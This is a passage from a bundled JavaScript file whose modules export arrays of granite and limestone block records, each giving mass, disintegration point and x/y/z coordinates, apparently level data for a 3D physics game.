s:10,mass:77e3,display_mass:1e3,disintegration_point:2300,x:-208.53155294333928,y:10.425446246372461,z:-1041.0897130724109},{material:"granite",dimensions:10,mass:77e3,display_mass:1e3,disintegration_point:2300,x:-189.99051160152212,y:10.401347647824997,z:-1024.2529756895005},{material:"limestone",dimensions:10,mass:6e4,display_mass:800,disintegration_point:2e3,x:-158.20933202964696,y:-13.763398400139112,z:-936.9239787328514},{material:"granite",dimensions:10,mass:77e3,display_mass:1e3,disintegration_point:2300,x:-209.1223048632704,y:14.794110412082423,z:-1020.7973316432975},{material:"limestone",dimensions:10,mass:6e4,display_mass:800,disintegration_point:2e3,x:-255.85818329872563,y:9.346611854722722,z:-1058.1929059287345},{material:"granite",dimensions:10,mass:77e3,display_mass:1e3,disintegration_point:2300,x:-312.2740447251627,y:9.447436716814105,z:-1062.973021053797},{material:"limestone",dimensions:10,mass:6e4,display_mass:800,disintegration_point:2e3,x:-224.1276819070546,y:9.765902222390729,z:-1081.9404581976685},{material:"limestone",dimensions:10,mass:6e4,display_mass:800,disintegration_point:2e3,x:-223.58088157680243,y:15.30853917677962,z:-1062.656030102053},{material:"limestone",dimensions:10,mass:6e4,display_mass:800,disintegration_point:2e3,x:-240.3066542301418,y:9.407589234039731,z:-1043.4845793183274},{material:"granite",dimensions:10,mass:77e3,display_mass:1e3,disintegration_point:2300,x:-315.18277352667724,y:9.434444371607102,z:-1121.5920359879456},{material:"granite",dimensions:15,mass:4e4,display_mass:3e3,disintegration_point:3e3,x:-192.92702781993216,y:29.880730797414813,z:-1039.6613552858307},{material:"limestone",dimensions:15,mass:35e3,display_mass:2600,disintegration_point:2800,x:-192.74941664193867,y:15.148427098221973,z:-1067.323900298915}];
},{}],192:[function(require,module,exports){
module.exports=[{material:"limestone",dimensions:15,mass:35e3,display_mass:2600,disintegration_point:2800,x:-208.6483727504214,y:15.498089932765744,z:-1041.1173522232864},{material:"granite",dimensions:15,mass:4e4,display_mass:3e3,disintegration_point:3e3,x:-179.40920168204747,y:15.228214575980955,z:-1031.163190759877},{material:"limestone",dimensions:15,mass:35e3,display_mass:2600,disintegration_point:2800,x:-199.45264665962327,y:15.228239266205593,z:-1069.6701971432049},{material:"granite",dimensions:15,mass:4e4,display_mass:3e3,disintegration_point:3e3,x:-171.3464115582438,y:18.73874799577807,z:-1059.8410453824295},{material:"limestone",dimensions:15,mass:35e3,display_mass:2600,disintegration_point:2800,x:-202.15301168281164,y:24.239553157914926,z:-1013.0302747513028},{material:"limestone",dimensions:15,mass:35e3,display_mass:2600,disintegration_point:2800,x:-258.8937448755722,y:14.45305686380481,z:-996.1565874123517},{material:"granite",dimensions:15,mass:4e4,display_mass:3e3,disintegration_point:3e3,x:-158.5468122772085,y:15.86868126105448,z:-1009.6412477225094},{material:"limestone",dimensions:15,mass:35e3,display_mass:2600,disintegration_point:2800,x:-235.956156334543,y:21.472024690524254,z:-1030.4731943708662},{material:"granite",dimensions:15,mass:4e4,display_mass:3e3,disintegration_point:3e3,x:-192.52667433654042,y:38.188588059185456,z:-1051.652133053555},{material:"granite",dimensions:10,mass:77e3,display_mass:1e3,disintegration_point:2300,x:-195.18230952667722,y:-13.063385196147426,z:-949.0727769022767},{material:"limestone",dimensions:10,mass:6e4,display_mass:800,disintegration_point:2e3,x:-286.63706536876055,y:9.363305457953603,z:-1055.3774366713783},{material:"limestone",dimensions:10,mass:6e4,display_mass:800,disintegration_point:2e3,x:-270.34626850279244,y:9.386931882070906,z:-1035.9213086662248},{material:"granite",dimensions:10,mass:77e3,display_mass:1e3,disintegration_point:2300,x:-224.26560747155747,y:9.63705450035957,z:-1082.385147176068},{material:"granite",dimensions:10,mass:77e3,display_mass:1e3,disintegration_point:2300,x:-245.72574410610156,y:10.266016187231093,z:-1050.6277486067677},{material:"limestone",dimensions:10,mass:6e4,display_mass:800,disintegration_point:2e3,x:-179.28444564966327,y:28.464947979036115,z:-1003.8504666615554},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:-255.02184534193347,y:4.486598699362505,z:-1037.6537153632016},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-212.68232311066706,y:5.490913907448436,z:-1058.801041286013},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:-219.36048048459523,y:17.27233945274255,z:-1070.4476506711778},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-211.69508080069397,y:16.49973874876988,z:-1085.0357997997503},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:-244.06135614094288,y:4.252299568143565,z:-1036.4684597253568},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-259.16295749228533,y:4.223854024310376,z:-1048.804428542119},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:-223.69818675858855,y:5.116137493060097,z:-1068.2591380844644},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-207.73091289109416,y:25.49774781806633,z:-1086.2240986455881},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:-195.29233316674222,y:26.896677874634634,z:-1031.56547096797},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-130.31152527576623,y:4.43262419121754,z:-1064.9833217964404},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:-224.02207633495937,y:11.832764022967874,z:-1053.0089858861081},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-69.08793991428674,y:4.270378634192451,z:-1022.3060223043683},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:-187.94625899719276,y:27.402130269364267,z:-1080.34617408137},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-178.9024368530937,y:26.000307304992916,z:-1076.58843909533},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:-198.62704857358963,y:28.95057738999241,z:-1084.1721952523828},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-161.60181333956714,y:5.2512731817814995,z:-1031.946906240475},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:-180.90962337927166,y:34.50350183290099,z:-1080.1788906118036},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-134.74020268892568,y:4.2299155226528855,z:-1026.8888465176522}];
},{}],193:[function(require,module,exports){
module.exports=[{material:"granite",dimensions:10,mass:77e3,display_mass:1e3,disintegration_point:2300,x:-188.51252137095048,y:9.138375722298916,z:-1524.5960737928808},{material:"granite",dimensions:15,mass:4e4,display_mass:3e3,disintegration_point:3e3,x:-159.33373424022358,y:14.127677651976411,z:-1522.8260191042382},{material:"granite",dimensions:10,mass:77e3,display_mass:1e3,disintegration_point:2300,x:-196.1812665000431,y:17.81299936836049,z:-1543.275535650991},{material:"granite",dimensions:10,mass:77e3,display_mass:1e3,disintegration_point:2300,x:-140.07646880390655,y:18.059154337646614,z:-1553.4079886145676},{material:"granite",dimensions:10,mass:77e3,display_mass:1e3,disintegration_point:2300,x:-164.1673468468008,y:9.829521659749012,z:-1546.9742965795956},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-199.7265020910921,y:4.28208727608619,z:-1538.0586503317948},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:-199.303764526966,y:3.9687263954074257,z:-1548.0648033009243},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:-194.59443943667148,y:6.985896701615711,z:-1556.0134131949058},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-206.38863179871896,y:11.299649998188116,z:-1534.7273559447485},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-205.37350374110238,y:4.800124953662051,z:-1555.643191113548},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:-215.13299656825646,y:6.3922677491485365,z:-1559.2820739080178},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-147.15325974762155,y:4.402507713014189,z:-1546.9512142496637},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-137.33004343929994,y:4.492372407535353,z:-1547.7444882286188},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-150.52125175035533,y:3.993938043505054,z:-1537.3929251413947},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-140.72116347805323,y:3.9866201587806813,z:-1538.818707140665},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-204.25301177422116,y:7.682721168307105,z:-1519.7384627309987},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-202.43905687884424,y:4.312390269042262,z:-1528.9112336607548},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:-233.91965396131016,y:5.525690607890015,z:-1525.1719824380832},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-260.2282624202811,y:5.456045940790338,z:-1545.0976926170194},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-198.83584651796411,y:14.64566575814345,z:-1515.2042721204007},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-202.29847850800883,y:14.424555441031822,z:-1526.579923835342},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-177.31746218037568,y:10.762267903553791,z:-1514.7488202278923},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-177.66774690527276,y:8.094531604453943,z:-1534.7878004756474},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:-189.7758029280897,y:17.01098499899751,z:-1512.2695258498566},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-185.42134480452938,y:20.739127251059347,z:-1533.2865665264785},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:-188.0856369735971,y:23.23914466039703,z:-1519.8283109256631},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-183.26796782291206,y:28.198834437154037,z:-1527.0325518949232},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:-183.19402027075887,y:4.370818758520018,z:-1551.9828320486974},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:-177.52280596724273,y:4.165264990242725,z:-1543.7584479276588},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-190.14691688703635,y:4.392396942462752,z:-1541.6754271884276},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-186.20918239628784,y:11.680925484639488,z:-1558.098666770689},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-199.19696365999445,y:18.861891646477044,z:-1565.9370195684066},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:-179.03315721930534,y:18.058938507076274,z:-1561.7326000128483},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:-176.41607104640426,y:10.609384233509104,z:-1555.5184551015107},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-151.72201955655666,y:8.271885202002267,z:-1554.9514355755286},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-88.62009140999626,y:7.897801291644781,z:-1543.4148250421092},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:-182.4971767194653,y:12.86771737187469,z:-1546.81116033327},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-146.8057165411708,y:12.472172432466628,z:-1541.0861878716814},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:-103.99294581917621,y:7.822588446430663,z:-1540.2704528527527},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:-201.726040700745,y:13.749188187927123,z:-1557.7680387023045},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:-177.07930868869462,y:19.411423591038535,z:-1552.0206134626806},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-169.4886673695913,y:16.883527729175636,z:-1559.086398891639},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-193.13473499004377,y:18.792056818559715,z:-1558.0003949599181},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:-162.39320155204965,y:22.95849309787159,z:-1562.63129564014},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:-156.95789995895103,y:15.13469900772781,z:-1559.8080793383315},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-218.68041455714362,y:6.058149490933978,z:-1532.5016330201267},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:-257.02665807036664,y:5.484909627094284,z:-1554.3294997303306},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-181.27298985027915,y:21.639033889721087,z:-1542.2389932285184},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-186.00125766276037,y:23.842559610061485,z:-1552.480842068474},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:-181.48503435915293,y:21.245256888309243,z:-1508.6751244417171},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-175.11628311581651,y:23.607960509698277,z:-1530.5217430718212},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:-170.7534460753456,y:23.4314600861058,z:-1545.5445525719933},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-154.58077605148196,y:20.525655667577514,z:-1551.2233867669274},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-171.6097519784614,y:19.735277419674826,z:-1508.0859651855},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-178.8437717855163,y:20.042332260129125,z:-1522.040035071041},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-173.36356843858815,y:17.431697484588806,z:-1538.0814198385901},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:-161.79332587532204,y:22.238429868764285,z:-1504.8052004489027},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-128.68896206535072,y:8.460927914607014,z:-1513.107861413111},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:-154.0262386127821,y:19.289988811271705,z:-1541.3671777283093},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-139.50562115400146,y:4.161271619514411,z:-1526.202845540195},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:-103.77641804293577,y:8.768179668991197,z:-1508.439432992972},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-132.45286931130966,y:7.47643450399141,z:-1534.5804880243727},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:-138.17121088350382,y:10.398537094074547,z:-1509.51181713337},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:-162.82669637705658,y:23.76947181781177,z:-1539.979082536933},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-147.5091069077019,y:26.553712694982618,z:-1543.5551589594738},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-114.98180916680822,y:8.698461191324284,z:-1514.5854589550938},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-83.42438337577825,y:9.472932966031284,z:-1505.6143846581267},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-142.09010695191498,y:11.286991264848124,z:-1532.4208019599782},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-138.3757570108791,y:17.229607325206803,z:-1525.32928493758},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-143.42753135508147,y:4.246930048510943,z:-1516.2879539417836},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-124.35392393277375,y:12.841715935139423,z:-1520.9738654038679},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:-136.8098808768093,y:16.634582832825366,z:-1538.9647594106411},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-150.57417488267205,y:21.846326987373654,z:-1563.4124620207872},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-174.22037042317956,y:25.734655800188623,z:-1515.6159135828127},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-171.2308155465791,y:30.15482687304432,z:-1524.0692964527982},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:-164.25737268518304,y:23.486535941182165,z:-1553.0565531949787},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:-186.20403178604332,y:24.948362883093147,z:-1562.4277499507787},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-147.10003170041426,y:25.118560991436702,z:-1533.8149567175344},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:-126.82276520407154,y:7.139117718834395,z:-1547.7060345205452}];
},{}],194:[function(require,module,exports){
module.exports=[{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-87.00672836839173,y:7.622142056725359,z:-1550.1305835655264},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-142.34203910056215,y:3.999310572455687,z:-1528.128856286509},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:46.54216649571526,y:10.094079234798317,z:-1543.7764122731235},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-116.00280022369121,y:9.100668282468206,z:-1502.2671986309324},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-145.4694536024538,y:8.867661512997687,z:-1511.50560530442},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:-135.83438042432633,y:6.826652542359102,z:-1535.463010139277},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-69.79049412436119,y:10.568685612852184,z:-1481.5604394302889},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-130.80646560332218,y:17.68121192441162,z:-1536.7499935954309},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:-121.39061271365338,y:8.38107081562376,z:-1518.9978906936672},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:-131.30431978197018,y:8.239875749730734,z:-1514.4236133147929},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-151.2746176489419,y:15.979985421914373,z:-1507.7179460324273},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:-140.50043820325834,y:17.56266602720236,z:-1535.0334662156793},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:-127.42844735582621,y:15.704618329343367,z:-1522.0282777969223},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-67.62613130904202,y:6.682185624310454,z:-1581.2887231152645},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-133.19417396930206,y:7.880851278396955,z:-1524.2417205799431},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-140.3433166468506,y:4.144589029890425,z:-1518.333571684125},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:-122.70210302911235,y:10.538240323209685,z:-1509.3225870764845},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-156.49483772002833,y:4.45843248627989,z:-1551.7192955782211},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-165.63852606326216,y:9.916539785050075,z:-1531.930642954725},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-192.4551557945213,y:4.484922352344669,z:-1534.064117340106},{material:"granite",dimensions:10,mass:77e3,display_mass:1e3,disintegration_point:2300,x:-136.072240117883,y:11.767600654914705,z:-1549.4752262077873},{material:"limestone",dimensions:10,mass:6e4,display_mass:800,disintegration_point:2e3,x:-152.2917123092514,y:9.052306673252133,z:-1538.151965045492},{material:"granite",dimensions:10,mass:77e3,display_mass:1e3,disintegration_point:2300,x:-179.75037251984253,y:9.423227514797215,z:-1526.8997634914313},{material:"granite",dimensions:10,mass:77e3,display_mass:1e3,disintegration_point:2300,x:-158.4231615961351,y:9.289161083257097,z:-1519.0778124858075},{material:"limestone",dimensions:10,mass:6e4,display_mass:800,disintegration_point:2e3,x:-103.82181893679888,y:13.802449891978677,z:-1512.9670109181172},{material:"granite",dimensions:10,mass:77e3,display_mass:1e3,disintegration_point:2300,x:-172.66241938455335,y:21.78637605987113,z:-1513.0085841979335},{material:"limestone",dimensions:10,mass:6e4,display_mass:800,disintegration_point:2e3,x:-196.15119184559035,y:17.294689260589006,z:-1518.6361378824606},{material:"granite",dimensions:10,mass:77e3,display_mass:1e3,disintegration_point:2300,x:-199.72086729967828,y:22.28233161117654,z:-1537.4216307596846},{material:"limestone",dimensions:10,mass:6e4,display_mass:800,disintegration_point:2e3,x:-196.02202142770352,y:9.488036319316441,z:-1552.1034615525655},{material:"limestone",dimensions:10,mass:6e4,display_mass:800,disintegration_point:2e3,x:-182.9514483382237,y:29.02800487164058,z:-1528.575877821101},{material:"limestone",dimensions:10,mass:6e4,display_mass:800,disintegration_point:2e3,x:-191.23086099949023,y:33.19392791485926,z:-1508.3850929249152},{material:"granite",dimensions:10,mass:77e3,display_mass:1e3,disintegration_point:2300,x:-295.7059490231912,y:9.7428343637113,z:-1540.251109664999},{material:"granite",dimensions:15,mass:4e4,display_mass:3e3,disintegration_point:3e3,x:-152.50468244620686,y:31.853369139330113,z:-1528.0467634337497},{material:"limestone",dimensions:15,mass:35e3,display_mass:2600,disintegration_point:2800,x:-172.655886664968,y:18.74502184105378,z:-1548.9331204652383}];
},{}],195:[function(require,module,exports){
module.exports=[{material:"limestone",dimensions:15,mass:35e3,display_mass:2600,disintegration_point:2800,x:-171.35965628472354,y:35.78353736789619,z:-1538.0931317706206},{material:"granite",dimensions:15,mass:4e4,display_mass:3e3,disintegration_point:3e3,x:-130.02105065758073,y:20.843526067462697,z:-1513.6497188562078},{material:"limestone",dimensions:15,mass:35e3,display_mass:2600,disintegration_point:2800,x:-190.96284246750443,y:33.73935380014591,z:-1560.712487911332},{material:"granite",dimensions:15,mass:4e4,display_mass:3e3,disintegration_point:3e3,x:-140.66645800058777,y:15.158924284952954,z:-1545.3619848282603},{material:"limestone",dimensions:15,mass:35e3,display_mass:2600,disintegration_point:2800,x:-158.19490256587082,y:14.456590367739455,z:-1521.6433138713637},{material:"limestone",dimensions:15,mass:35e3,display_mass:2600,disintegration_point:2800,x:-188.51022602062798,y:14.462096638524446,z:-1525.8339951985288},{material:"granite",dimensions:15,mass:4e4,display_mass:3e3,disintegration_point:3e3,x:-51.92554766878871,y:17.82595463089808,z:-1553.7521820290087},{material:"limestone",dimensions:15,mass:35e3,display_mass:2600,disintegration_point:2800,x:-185.42712691952568,y:39.13290206764326,z:-1509.5256645530808},{material:"granite",dimensions:15,mass:4e4,display_mass:3e3,disintegration_point:3e3,x:-153.37351271072308,y:37.713998107923615,z:-1561.9265968258792},{material:"granite",dimensions:10,mass:77e3,display_mass:1e3,disintegration_point:2300,x:-108.14380553564216,y:13.48463911750307,z:-1522.9663911031257},{material:"limestone",dimensions:10,mass:6e4,display_mass:800,disintegration_point:2e3,x:-239.13107624845406,y:10.873082762045835,z:-1544.6857268263225},{material:"limestone",dimensions:10,mass:6e4,display_mass:800,disintegration_point:2e3,x:-179.635330009833,y:9.382174262999445,z:-1548.6346005516384},{material:"granite",dimensions:10,mass:77e3,display_mass:1e3,disintegration_point:2300,x:-200.41270400291492,y:9.462415328865413,z:-1551.9013236501278},{material:"granite",dimensions:10,mass:77e3,display_mass:1e3,disintegration_point:2300,x:-333.930914729751,y:8.899651825089606,z:-1522.1903290190437},{material:"limestone",dimensions:10,mass:6e4,display_mass:800,disintegration_point:2e3,x:-161.8050206260113,y:32.45840169546355,z:-1504.840199519072},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:-202.55768730532046,y:3.9913948439518023,z:-1535.3904870353786},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-214.90684853841978,y:6.208604006706169,z:-1553.1261055455122},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:-262.7539480031856,y:5.3640179815680815,z:-1544.9739413430837},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-241.43453361091565,y:5.853790825321066,z:-1560.1792849646642},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:-143.33230807562003,y:26.626289808043268,z:-1526.8555994439998},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-209.8027294126142,y:6.343987250780411,z:-1527.3883999406423},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:-225.9680677378549,y:6.096093657434971,z:-1552.753620975186},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-199.78137981782317,y:16.82589347445333,z:-1564.6371861961725},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:-202.9742054386562,y:20.91003601501586,z:-1542.5181499275527},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-113.2459710219215,y:6.9923481628163735,z:-1548.9413590577772},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:-211.6792052428047,y:10.219485731210726,z:-1561.6873388540664},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-85.6521988436701,y:8.33919592175871,z:-1531.8843063496683},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:-161.12034971839032,y:13.128974762280496,z:-1549.2127140982311},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-156.5902603325768,y:4.3945628208436505,z:-1550.6841428946802},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:-205.38821076110327,y:13.351728791771533,z:-1536.423968550374},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-119.20029817041828,y:7.519704642522686,z:-1540.5766897288618},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:-167.80635340187587,y:13.80926789368925,z:-1556.4381083456801},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-163.19553189658114,y:4.202570571259895,z:-1541.131939782839}];
},{}],196:[function(require,module,exports){
module.exports=[{material:"granite",dimensions:10,mass:77e3,display_mass:1e3,disintegration_point:2300,x:171.88232043116753,y:11.49484578300065,z:-570.3497544159064},{material:"granite",dimensions:15,mass:4e4,display_mass:3e3,disintegration_point:3e3,x:196.4143979171152,y:18.51148135467474,z:-535.4088623340359},{material:"granite",dimensions:10,mass:77e3,display_mass:1e3,disintegration_point:2300,x:185.77305063896117,y:11.865721610170558,z:-605.8122490230826},{material:"granite",dimensions:10,mass:77e3,display_mass:1e3,disintegration_point:2300,x:273.01048118402906,y:11.290607005260275,z:-558.7108447288056},{material:"granite",dimensions:10,mass:77e3,display_mass:1e3,disintegration_point:2300,x:220.0419475316043,y:11.34237696869071,z:-583.5372177241514},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:116.95336393976412,y:6.240964087628574,z:-609.9733548248923},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:167.8872439378449,y:6.39090315052711,z:-642.1826100179221},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:196.12335338394686,y:6.306360323629821,z:-614.7445134354418},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:123.21065292089712,y:6.4224441482678225,z:-630.2671124172181},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:184.834761577912,y:6.064682086958647,z:-643.0329013370596},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:194.1955384501982,y:6.397611549048195,z:-624.460171724177},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:232.39170248765717,y:6.185464522683274,z:-577.0869719748844},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:248.49395427014963,y:6.441927166056839,z:-571.9160072019172},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:247.67528697726328,y:6.441330626747415,z:-558.897438368709},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:255.03075546323763,y:6.160217570897104,z:-547.1192255671746},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:148.39083511276218,y:6.4962268700650245,z:-578.8865139090223},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:154.9468639477586,y:6.2508000891658435,z:-601.